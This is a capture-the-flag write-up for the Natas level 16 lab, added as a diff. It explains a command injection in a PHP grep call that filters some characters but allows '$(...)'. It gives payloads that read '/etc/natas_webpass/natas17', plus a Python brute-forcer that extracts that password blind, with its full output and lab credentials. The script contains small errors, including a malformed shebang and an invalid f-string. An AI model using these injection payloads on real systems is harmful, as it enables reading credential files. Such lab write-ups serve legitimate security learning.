@@ -1,0 +1,192 @@
+Title:Natas Level 15 → Level 16
+
+#Credentials
+Username: natas16
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+URL:      http://natas16.natas.labs.overthewire.org
+
+#Concept
+This level is similar to the previous level (9 and 10) which involved a vulnerability called "Command_Inejection" Which basically allows you to inject command and that command gets executed,in the previous levels (9 and 10) were basic and then advanced command injection where the inputs were sanitized but in t his level it is more sanitized which makes it more difficult to perform.
+
+#Solution
+
+1.Login to level using the credentials mentioned above.
+
+2.After logging in the website will display the input field similar to the previous level(9 and 10).
+
+3.Click on the source code.
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+
+#The new filters were added but there is still way to by pass this aswell.
+
+4.Give old command injections used in the previous level
+
+#I know this is not important but you have to give it a try.
+->Well what do you know it says "Input contains an illegal character!"
+
+#One more thing I noticed that the "$" and the Paranthesis are not present there let's give it a try.
+
+5.Type in the following ". $(cat /etc/natas_webpass/natas17)
+
+#Hmm the output gave out nothing I guess we can say it worked out but it didn't display it why?
+
+#Now I got it the reason is that in the passthru the "key" part is in double quotation which basically acts as a string not as a command the previous levels were something like this
+
+("grep -i $key dictionary.txt")
+
+hence this is not executing the command, but lets try another way
+
+6.Type in the following "$(grep a /etc/natas_webpass/natas17)"
+
+#The reason why I gave this command is that when the "key" is taking the string but not a command i thought lets give another command which takes in the string and displays it,suprisingly the grep did worked out like it displayed the words with 'a' but didn't execute the second command.
+
+#Lets try giving the other letter besides 'a' $grep( b /etc/natas_webpass/natas17), this does not display anything why? is it because the password contains the letter 'b' in it? or does it not contain the letter b in the password? Lets test this theory.
+
+#This reminds me similar to  the blindSQLi where if there was an error it would not display it just in reverse like displaying the output where the letter is not present in the password and if present it would not display it, but this would take a long time to check each every character so its better that we neeed to create a bruteforcer.
+
+7.Go to your local machine and create bruteforcer.py
+
+->Add the following code into the file
+
+#!/usr/bin/env/python3
+
+import requests
+
+# --- Configuration ---
+username = 'natas16'
+password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'  # Replace with your real Natas16 password
+url = f'http://natas16.natas.labs.overthewire.org/'
+
+# --- Character Set to Test ---
+charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+# --- Helper Function ---
+def get_output_content(response_text):
+    """Extracts and returns the content within <pre>...</pre> tags."""
+    start = response_text.find('<pre>')
+    end = response_text.find('</pre>', start)
+    if start == -1 or end == -1:
+        return ''
+    return response_text[start+5:end].strip()
+
+# --- Get Baseline Output ---
+print("[*] Getting baseline output to compare against...")
+baseline_resp = requests.get(url, params={'needle': 'dummy'}, auth=(username, password))
+baseline_output = get_output_content(baseline_resp.text)
+if not baseline_output:
+    print("[-] Failed to get baseline output. Aborting.")
+    exit(1)
+
+# --- Phase 1: Character Discovery ---
+print("\n[*] Phase 1: Finding valid characters in the password...")
+valid_chars = ''
+for ch in charset:
+    payload = f'$(grep {ch} /etc/natas_webpass/natas17)dummy'
+    r = requests.get(url, params={'needle': payload}, auth=(username, password))
+    output = get_output_content(r.text)
+    if output != baseline_output:
+        valid_chars += ch
+        print(f"[+] Character '{ch}' is in the password.")
+
+print(f"\n[*] Valid characters found: {valid_chars}")
+
+# --- Phase 2: Brute-force the password ---
+print("\n[*] Phase 2: Brute-forcing the password...")
+found_password = ''
+for i in range(32):
+    for ch in valid_chars:
+        attempt = found_password + ch
+        payload = f'$(grep ^{attempt} /etc/natas_webpass/natas17)dummy'
+        r = requests.get(url, params={'needle': payload}, auth=(username, password))
+        output = get_output_content(r.text)
+        if output != baseline_output:
+            found_password += ch
+            print(f"[+] Password so far: {found_password + '*' * (32 - len(found_password))}")
+
+print(f"{+}DING! Here's your final Password: '{found_password}' ") #If the last line didn't work you can remove it
+
+#Summary of the code
+
+Phase	What it does
+Phase 1	Finds which letters are used in the password
+Phase 2	Tries one character at a time to build the full password
+Comparison	Checks if server response changes to know you're right
+
+8.Change the file permission and then run the file ./bruteforcer.py
+
+#Output
+
+*] Getting baseline output to compare against...
+
+[*] Phase 1: Finding valid characters in the password...
+[+] Character '0' is in the password.
+[+] Character '5' is in the password.
+[+] Character '7' is in the password.
+[+] Character '8' is in the password.
+[+] Character '9' is in the password.
+[+] Character 'b' is in the password.
+[+] Character 'h' is in the password.
+[+] Character 'j' is in the password.
+[+] Character 'k' is in the password.
+[+] Character 'o' is in the password.
+[+] Character 'q' is in the password.
+[+] Character 's' is in the password.
+[+] Character 'v' is in the password.
+[+] Character 'w' is in the password.
+[+] Character 'C' is in the password.
+[+] Character 'E' is in the password.
+[+] Character 'F' is in the password.
+[+] Character 'H' is in the password.
+[+] Character 'J' is in the password.
+[+] Character 'L' is in the password.
+[+] Character 'N' is in the password.
+[+] Character 'O' is in the password.
+[+] Character 'T' is in the password.
+
+[*] Valid characters found: 05789bhjkoqsvwCEFHJLNOT
+
+[*] Phase 2: Brute-forcing the password...
+[+] Password so far: E*******************************
+[+] Password so far: Eq******************************
+[+] Password so far: Eqj*****************************
+[+] Password so far: EqjH****************************
+[+] Password so far: EqjHJ***************************
+[+] Password so far: EqjHJb**************************
+[+] Password so far: EqjHJbo*************************
+[+] Password so far: EqjHJbo7************************
+[+] Password so far: EqjHJbo7L***********************
+[+] Password so far: EqjHJbo7LF**********************
+[+] Password so far: EqjHJbo7LFN*********************
+[+] Password so far: EqjHJbo7LFNb********************
+[+] Password so far: EqjHJbo7LFNb8*******************
+[+] Password so far: EqjHJbo7LFNb8v******************
+[+] Password so far: EqjHJbo7LFNb8vw*****************
+[+] Password so far: EqjHJbo7LFNb8vwh****************
+[+] Password so far: EqjHJbo7LFNb8vwhH***************
+[+] Password so far: EqjHJbo7LFNb8vwhHb**************
+[+] Password so far: EqjHJbo7LFNb8vwhHb9*************
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s************
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s7***********
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75**********
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75h*********
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75ho********
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hok*******
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh******
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5*****
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5T****
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF***
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0**
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0O*
+[+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+[+] DING! Here's your final password: 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
+
+
+9.Done.
